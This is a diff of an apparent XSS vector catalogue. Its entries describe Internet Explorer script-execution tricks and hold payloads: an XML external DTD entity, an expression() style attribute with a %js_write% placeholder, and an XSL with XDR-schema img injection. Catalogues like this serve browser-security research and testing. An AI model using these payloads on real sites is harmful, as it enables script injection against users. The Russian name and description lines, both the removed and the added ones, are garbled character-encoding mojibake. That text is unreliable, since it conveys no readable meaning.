@@ -2378,7 +2378,7 @@ var items =
         'name'       : {
             'en' : 'Arbitrary payload injection via XML external DTD in IE',
             'ja' : '',
-            'ru' : '�������� ���������� javascript-���� ����� ������� ����������� ���� ��������� (DTD)  ',
+            'ru' : 'Èíúåêöèÿ óäàëåííîãî javascript-êîäà ÷åðåç âíåøíåå îïðåäåëåíèå òèïà äîêóìåíòà (DTD)',
             'de' : ''
         },
         'data'       : '<?xml-stylesheet type="text/css"?><!DOCTYPE x SYSTEM "test.dtd"><x>&x;</x>',
@@ -2392,7 +2392,7 @@ var items =
         'description': {
             'en' : 'IE requires to display html-tags of any users stylesheet and namespace prefix "html".',
             'ja' : '',
-            'ru' : 'IE ��� ����������� HTML-����� ������� ������������� ������� �� xml-�������� ���������������� ������� ������, � ����� ���������� ���������������� ������������ ���� � ��������� "html".',
+            'ru' : 'IE äëÿ îòîáðàæåíèÿ HTML-òåãîâ òðåáóåò îáÿçàòåëüíîãî íàëè÷èÿ íà xml-ñòðàíèöå ïîëüçîâàòåëüñêîé òàáëèöû ñòèëåé, à òàêæå îáúÿâëåíèÿ ñîîòâåòñòâóþùåãî ïðîñòðàíñòâà èìåí ñ ïðåôèêñîì "html".',
             'de' : ''
         },
         'urls'    : [],
@@ -2414,14 +2414,14 @@ var items =
         'name'       : {
             'en' : 'XML JavaScript execution via style attribute in IE',
             'ja' : '',
-            'ru' : '���������� javascript c ������� ��������� �������� � IE �� XML-��������',
+            'ru' : 'Âûïîëíåíèå javascript c ïîìîùüþ ñòèëåâîãî àòðèáóòà â IE íà XML-ñòðàíèöå',
             'de' : ''
         },
         'data'       : '<?xml-stylesheet type="text/css"?><root style="x:expression(%js_write%)"/>',
         'description': {
             'en' : 'IE supports the style attribute to the xml-pages. So JavaScript can be executed in any tag.',
             'ja' : '',
-            'ru' : 'IE ������������ �������� ������� �� xml-���������. ����� �������, �������� ����� ���� �������� � ����� ����.',
+            'ru' : 'IE ïîääåðæèâàåò ñòèëåâîé àòðèáóò íà xml-ñòðàíèöàõ. Òàêèì îáðàçîì, ÿâàñêèïò ìîæåò áûòü âûïîëíåí â ëþáîì òåãå.',
             'de' : ''
         },
         'urls'    : [],
@@ -2443,7 +2443,7 @@ var items =
         'name'       : {
             'en' : 'Arbitrary payload injection via XSL + XDR-schema in IE',
             'ja' : '',
-            'ru' : '�������� ���������� javascript-���� � IE � ������� XSL � XDR-�����',
+            'ru' : 'Èíúåêöèÿ óäàëåííîãî javascript-êîäà â IE ñ ïîìîùüþ XSL è XDR-ñõåìû',
             'de' : ''
         },
         'data'       : '<?xml-stylesheet type="text/xsl" href="#"?><img xmlns="x-schema:xdrtest.xml"/>',
@@ -2457,7 +2457,7 @@ var items =
         'description': {
             'en' : 'The namespace "html" is automatically determined using XSL. Missing attributes for the "img" tag is obtained from the XDR-schema.',
             'ja' : '',
-            'ru' : '������������ ���� "html" ������������� ������������ IE � ������� XSL-�������. ����������� �������� ��� ���� "img" ������������ �� XDR-�����.',
+            'ru' : 'Ïðîñòðàíñòâî èìåí "html" àâòîìàòè÷åñêè îïðåäåëÿåòñÿ IE ñ ïîìîùüþ XSL-òàáëèöû. Íåäîñòàþùèå àòðèáóòû äëÿ òåãà "img" çàèìñòâóþòñÿ èç XDR-ñõåìû.',
             'de' : ''
         },
         'urls'    : ['http://msdn.microsoft.com/en-us/library/ms256208(v=VS.100).aspx'],
